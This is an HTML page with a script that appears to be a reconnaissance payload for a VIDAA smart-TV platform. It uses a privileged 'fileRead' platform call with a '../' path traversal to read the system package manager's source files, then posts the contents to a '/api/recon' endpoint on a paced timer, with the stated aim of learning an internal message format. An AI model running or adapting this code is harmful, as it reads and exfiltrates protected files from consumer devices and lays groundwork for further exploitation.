<!doctype html>
<!-- read the vendor pkgmgr service source to learn this build's superwatch
     message format. Paced reads. -->
<html><head><meta charset="utf-8"><title>pkgmgr</title></head>
<body><pre id="out">reading…</pre><script>
(function () {
  "use strict";
  var out = document.getElementById("out");
  var report = { started: new Date().toISOString(), files: {} };
  function save(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open("POST", "/api/recon", true);
      x.setRequestHeader("Content-Type", "application/json");
      x.send(JSON.stringify({ tag: tag, at: new Date().toISOString(), report: report }));
    } catch (e) {}
  }
  function raw(path) {
    try {
      var r = HiUtils_createRequest("fileRead", { path: path, mode: 6 });
      var msg = r.msg;
      if (msg != null && typeof msg === "object") msg = JSON.stringify(msg);
      return { ret: r.ret, msg: String(msg == null ? "" : msg).slice(0, 20000) };
    } catch (e) { return { exception: String(e) }; }
  }
  var S = "../APPS/pkgs/tv.vidaa.jsservice.system/current/services/pkgmgr/";
  var T = [S + "package.json", S + "index.js", S + "main.js"];
  var i = 0;
  function next() {
    if (i >= T.length) { try { out.textContent = JSON.stringify(report, null, 1); } catch (e) {} save("pkgmgr-end"); return; }
    report.files["f" + i] = { path: T[i], r: raw(T[i]) };
    save("pkgmgr-" + i);
    i++;
    setTimeout(next, 2500);
  }
  next();
})();
</script></body></html>
